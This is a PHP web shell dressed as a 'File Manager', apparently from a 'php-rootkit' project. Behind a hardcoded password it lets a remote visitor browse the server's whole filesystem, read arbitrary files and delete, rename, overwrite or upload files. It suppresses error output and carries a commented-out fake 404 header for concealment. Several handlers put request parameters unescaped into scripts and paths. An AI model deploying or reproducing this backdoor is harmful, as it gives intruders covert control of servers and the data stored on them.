<?php

// File Manager
// Copyright (C)2021 - Afrizal F.A - incrustwerush.org

error_reporting(0);
// header('HTTP/1.0 404 Not Found', true, 404);
session_start();

if(isset($_REQUEST['logout'])) {

    session_destroy();
    echo "<script>window.location='?'</script>";
    exit();

}

class file_manager
{

    public function login()
    {

        $pass = "icwr";

        if(!empty($_POST['passwd']) && $_POST['passwd'] == $pass) {

            $_SESSION['flmngr'] = $pass;
            echo "<script>window.location='?'</script>";

        }
?>
<!DOCTYPE html>
<html>

<head>
    <title>File Manager - incrustwerush.org</title>
    <link rel="icon" href="https://raw.githubusercontent.com/ICWR-TECH/php-rootkit/master/folder.png">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
</head>

<body style="background-color: black;">

    <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 70%;" class="text-center">

        <img style="margin: 20px; width: 170px; border: 3px solid white; border-radius: 20px;" src="https://raw.githubusercontent.com/ICWR-TECH/php-rootkit/master/folder.png" />
        <br />
        <span class="text-white" style="font-size: 30px;">( File Manager - incrustwerush.org )</span>
        <br />

        <form class="m-3 form-group" enctype="multipart/form-data" method="post">
            <input class="form-control" style="margin: 0 auto; width: 50%;" type="password" name="passwd" placeholder="Enter the password....">
            <br />
            <input class="form-control btn btn-primary" style="margin: 0 auto; width: 50%;" type="submit" value="Login">
            <br />
        </form>

    </div>

    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js" integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" integrity="sha384-w1Q4orYjBQndcko6MimVbzY0tgp4pWB4lZ7lr30WKz0vr/aWKhXdBNmNb5D92v7s" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ/JpcUGGOn+Y7RsweNrtN/tE3MoK7ZeZDyx" crossorigin="anonymous"></script>

</body>

</html>

<?php

    }

    public function directory()
    {

        $do = "<a class=\"text-dark\" href=\"?d=/\">/</a>";
        $dir_raw = str_replace('\\', "/", getcwd());
        $host = $_SERVER['HTTP_HOST'];

        if (!empty($_GET['d']) && $dn = $_GET['d']) {

            $get_dir = $dn;

        }

        if (empty($_GET['d'])) {

            $dir = $dir_raw;

        } else {

            $dir = $get_dir;

        }

        $exp = explode("/", $dir);

        foreach($exp as $x=>$dirx)
        {

            if(empty($dirx)){

                continue;

            }

            $do .= "<a class=\"text-dark\" href='?d=";

            for($i=0;$i<=$x;$i++)
            {

                $do .= $exp[$i]."/";

            }

            $do .= "'>$dirx</a>/";

        }

            chdir($dir);
            return $do;

    }

    public function file_load($file_name)
    {

        $f = file_get_contents($file_name);
        return $f;
        

    }

    public function file_edit($file_name, $text)
    {

        $fedit = fopen($file_name, "w");

        if(fwrite($fedit, $text)) {

            $result = "<script>alert('Edit File Success !!!'); window.location = '?file=$file_name';</script>";
        
        } else {

            $result = "<script>alert('Edit File Failed !!!'); window.location = '?file=$file_name';</script>";
        
        }

        fclose($fedit);
        return $result;

    }

    public function file_rename($file_name, $rename)
    {

        if(copy($file_name, $rename)) {

            unlink($file_name);
            $result = "<script>alert('File Renamed !!!'); window.location = '?';</script>";

        } else {

            $result = "<script>alert('Failed Rename File !!!'); window.location = '?file=$file_name';</script>";
          
        }

        return $result;

    }

    public function file_delete($file_name)
    {

        if(unlink($file_name)) {

            $result = "<script>alert('File Deleted !!!'); window.location = '?';</script>";
        
        } else {

            $result = "<script>alert('Failed Deleted File !!!'); window.location = '?file=$file_name';</script>";
        
        }

        return $result;

    }

    public function directory_rename($dir_name, $rename)
    {

        if(mkdir("../$rename")) {

            rmdir("../$dir_name");
            $result = "<script>alert('This Folder is Renamed !!!'); window.location = '?d=$dir_name/..';</script>";
        
        } else {
        
            $result = "<script>alert('This Folder is Failed Rename !!!'); window.location = '?';</script>";
        
        }

        return $result;

    }

    public function directory_delete($dir_name)
    {

        if(rmdir($dir_name)) {

            $result = "<script>alert('Folder Deleted !!!'); window.location = '?d=$dir_name/..';</script>";
        
        } else {
            
            $result = "<script>alert('This Folder is Failed Delete !!!'); window.location = '?';</script>";
        
        }

        return $result;

    }

    public function file_upload($file_name)
    {

        if(copy($file_name['tmp_name'], $file_name['name'])) {

            $result = "[+] Success : ". $file_name['name'];

        } else {

            $result = "[-] Failed : ". $file_name['name'];

        }

        return $result;

    }

    public function show_folders()
    {

        $scandir = array_diff(scandir(getcwd()), array('.', '..'));
        $result = "";

        foreach($scandir as $x => $sdir)
        {

            if (is_dir($sdir)) {

                $path = "?d=" . getcwd() . "/" . $sdir;
                $result .= "<div class=\"col-xl-2\"><a class=\"text-dark\" href=\"$path\"><div class=\"card bg-transparent border-light\" style=\"width: 100px;\"><img class=\"card-img-top\" src=\"https://raw.githubusercontent.com/ICWR-TECH/php-rootkit/master/folder.png\" alt=\"$sdir\"><div class=\"card-body\">$sdir</div></div></a></div>";

            }

        }

        return $result;

    }

    public function show_files()
    {

        $scandir = array_diff(scandir(getcwd()), array('.', '..'));
        $result = "";

        foreach($scandir as $x => $sdir)
        {

            if (is_file($sdir)) {

                $path = "?f=" . getcwd() . "/" . $sdir;
                $result .= "<div class=\"col-xl-2\"><a class=\"text-dark\" href=\"$path\"><div class=\"card bg-transparent border-light\" style=\"width: 100px;\"><img class=\"card-img-top\" src=\"https://raw.githubusercontent.com/ICWR-TECH/php-rootkit/master/file.png\" alt=\"$sdir\"><div class=\"card-body\">$sdir</div></div></a></div>";

            }

        }

        return $result;

    }

    public function formatBytes($size, $precision = 2)
    {

        $base = log($size, 1024);
        $suffixes = array('', 'KB', 'MB', 'GB', 'TB');   
        return round(pow(1024, $base - floor($base)), $precision) .' '. $suffixes[floor($base)];
        
    }

}

$func = new file_manager();

if (empty($_SESSION['flmngr'])) {

    $func->login();
    exit();

}

?>
<!DOCTYPE html>
<html>

<head>
    <title>File Manager - incrustwerush.org</title>
    <link rel="icon" href="https://raw.githubusercontent.com/ICWR-TECH/php-rootkit/master/folder.png">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
</head>

<body class="bg-dark">

    <div class="container p-0" style="border: 1px solid black;">
        <div class="bg-white border-bottom border-dark p-1">
            <div class="row">
                <div class="col-4 text-left"><!-- Copyright &copy;<?php echo date("Y"); ?> - incrustwerush.org --></div>
                <div class="col-4 text-center">
                    <b>File Manager - incrustwerush.org</b>
                </div>
                <div class="col-4 text-right">
                    <a class="btn btn-primary rounded" href="?page=blank">_</a>
                    <a class="btn btn-success rounded" href="?page=blank">-</a>
                    <a class="btn btn-danger rounded" href="?logout">X</a>
                </div>
            </div>
        </div>
        <div class="bg-light text-dark p-1 border-bottom border-dark">
            <a class="text-dark" href="?">[ File Manager ]</a>
            <a class="text-dark" href="#">[ Upload ]</a>
            <a class="text-dark" href="#">[ Scripting ]</a>
            <a class="text-dark" href="#">[ About ]</a>
        </div>
        <div class="bg-light text-dark p-1 border-bottom border-dark">
            <div class="row">
                <div class="col-3 border-right border-dark">
                    Directory
                </div>
                <div class="col-9">
                    <div class="p-1 border border-dark">
                        <?php echo $func->directory($_SESSION['dir']); ?>
                    </div>
                </div>
            </div>
        </div>
        <div class="bg-light text-dark p-1">
            <div class="row">
                <div class="col-3 border-right border-dark">
                    <div class="border border-dark">
                        <div class="bg-dark text-white p-1">
                            Action
                        </div>
                        <div class="text-dark">
                            <ul>
                                <li><a class="text-dark" href="#">New File</a></li>
                                <li><a class="text-dark" href="#">New Folder</a></li>
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="col-9">
<?php
if (empty($_GET) || $_GET['d']) {
?>
                    <div class="row">
                        <?php echo $func->show_folders(); ?>
                        <?php echo $func->show_files(); ?>
                    </div>
<?php
} else if (!empty($_GET['f'])) {
?>
                    <textarea rows="15" style="width: 100%;"><?php echo htmlspecialchars($func->file_load($_GET['f'])); ?></textarea>
<?php
}
?>
                </div>
            </div>
        </div>
        <div class="bg-light text-dark p-1 border-top border-dark">
            Free Space : <?php echo $func->formatBytes(disk_free_space("/")); ?>
        </div>
    </div>

</body>

</html>
